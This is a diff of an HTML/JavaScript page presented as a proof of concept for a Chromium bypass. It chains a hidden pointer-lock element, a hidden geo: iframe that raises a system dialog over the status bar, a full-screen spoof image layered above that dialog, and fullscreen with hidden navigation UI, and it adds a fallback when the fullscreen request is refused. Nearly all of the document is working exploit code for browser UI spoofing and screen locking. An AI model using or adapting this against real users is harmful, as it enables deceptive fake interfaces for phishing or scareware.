@@ -3,7 +3,7 @@
   <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no" />
-    <title>Ultimate Master PointerLock & CVE-2025-14812 PoC</title>
+    <title>Ultimate Chromium Bypass & Fullscreen PoC</title>
     <style>
       body, html {
         margin: 0;
@@ -48,16 +48,18 @@
         width: 100vw;
         height: 100vh;
         object-fit: cover;
-        z-index: 99999;
+        z-index: 999999;
+        pointer-events: none;
       }
       #pointerLockElement {
-        width: 0;
-        height: 0;
+        width: 1px;
+        height: 1px;
         position: absolute;
+        opacity: 0;
       }
     </style>
     <script>
-      // Touch event handlers untuk manajemen fokus/blur input sentuh seluler tingkat lanjut
+      // Touch event handlers untuk manajemen fokus input sentuh seluler
       addEventListener("touchstart", (event) => {});
       window.ontouchstart = (event) => {
         let input = document.getElementById("focusInput");
@@ -83,7 +85,7 @@
       <img id="spoof" style="display: none;" src="spoof.png" alt="Spoof Layer">
 
       <div class="container" id="mainContainer">
-        <button id="execBtn">INITIALIZE ADVANCED POINTERLOCK & BYPASS</button>
+        <button id="execBtn">INITIALIZE DEEP BYPASS & OVERLAY</button>
         <div class="info" id="statusInfo">Status: Ready for interaction.</div>
       </div>
     </div>
@@ -93,35 +95,35 @@
       let statusInfo = document.getElementById("statusInfo");
 
       execButton.onclick = async function () {
-        statusInfo.innerText = "Status: Deploying pointer lock, intent vectors & dialog...";
+        statusInfo.innerText = "Status: Executing security context bypass sequence...";
         this.style.display = "none";
 
         try {
-          // 1. Integrasi Pointer Lock API dengan penanganan Promise yang aman
+          // 1. Eksekusi Pointer Lock secara sinkron/asinkron untuk mengikat konteks fokus pointer
           let plElement = document.getElementById("pointerLockElement");
           if (plElement && plElement.requestPointerLock) {
             try {
               await plElement.requestPointerLock();
             } catch (err) {
-              console.debug("PointerLock deferred/restricted:", err.message);
+              console.debug("PointerLock restriction handled:", err.message);
             }
           }
 
-          // 2. Memicu iframe geo: intent untuk memunculkan dialog sistem secara instan menutupi status bar
+          // 2. Memicu iframe skema URI 'geo:' untuk memunculkan dialog sistem secara instan menutupi area bilah status
           let spoofFrame = document.createElement("iframe");
           spoofFrame.style.display = "none";
           spoofFrame.src = "geo:0,0?q=apple.com";
           document.body.appendChild(spoofFrame);
 
-          statusInfo.innerText = "Status: Dialog active. Deploying visual overlay & locking screen...";
+          statusInfo.innerText = "Status: Dialog intent dispatched. Deploying visual wrapper...";
 
-          // 3. Memunculkan elemen gambar spoof secara penuh di atas lapisan dialog
+          // 3. Menampilkan elemen gambar spoof secara penuh di atas lapisan dialog sistem
           let spoofImg = document.getElementById("spoof");
           if (spoofImg) {
             spoofImg.style.display = "block";
           }
 
-          // 4. Eksekusi Fullscreen agresif pada kontainer terstruktur dengan navigasi tersembunyi setelah jeda 2 detik
+          // 4. Eksekusi Fullscreen agresif pada kontainer target dengan parameter navigasi tersembunyi
           setTimeout(() => {
             let fsElement = document.getElementById("fullscreenElement") || document.documentElement;
             
@@ -132,18 +134,23 @@
 
             if (requestFS) {
               requestFS.call(fsElement, { navigationUI: "hide" }).catch((err) => {
-                console.debug("Fullscreen deferred:", err.message);
+                // Fallback otomatis jika opsi objek ditolak oleh kebijakan versi peramban tertentu
+                try {
+                  requestFS.call(fsElement);
+                } catch (e) {
+                  console.debug("Fullscreen fallback active:", e.message);
+                }
               });
             }
 
-            // Menyembunyikan kontainer tombol awal secara permanen
+            // Menyembunyikan elemen antarmuka tombol utama secara permanen setelah penguncian layar penuh
             let container = document.getElementById("mainContainer");
             if (container) {
               container.style.display = "none";
             }
             
-            statusInfo.innerText = "Status: PointerLock & Bypass sequence complete. Fullscreen overlay locked.";
-          }, 250);
+            statusInfo.innerText = "Status: Fullscreen security bypass active & locked.";
+          }, 280);
 
         } catch (err) {
           statusInfo.innerText = "Status: Critical execution error: " + err.message;
